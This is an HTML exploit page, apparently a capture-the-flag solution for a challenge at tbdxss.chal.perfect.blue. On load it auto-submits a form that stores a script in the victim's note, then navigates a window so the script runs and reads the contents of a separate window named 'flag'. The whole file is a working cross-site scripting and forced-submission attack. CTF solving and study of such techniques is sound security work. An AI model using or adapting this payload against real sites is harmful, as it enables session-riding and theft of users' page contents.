<html>
<body>
    <form action="http://tbdxss.chal.perfect.blue/change_note" id="noteform" method=POST target="note">
        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content">
            <script>
                var flagWindow = window.open('', 'flag');
                alert(flagWindow.document.body.innerText);
            </script>
        </textarea>
        <input type="submit" value="submit">
    </form>

    <script>
        //Thanks to vakzz for the testing and exploit
        window.open("http://tbdxss.chal.perfect.blue/note", "flag")
        const noteWindow = window.open("", "note")

        const noteform = document.getElementById("noteform");
        noteform.submit()


        setTimeout(() => {
            noteWindow.location = "http://tbdxss.chal.perfect.blue/note"
        }, 1000);
    </script>
</body>

</html>

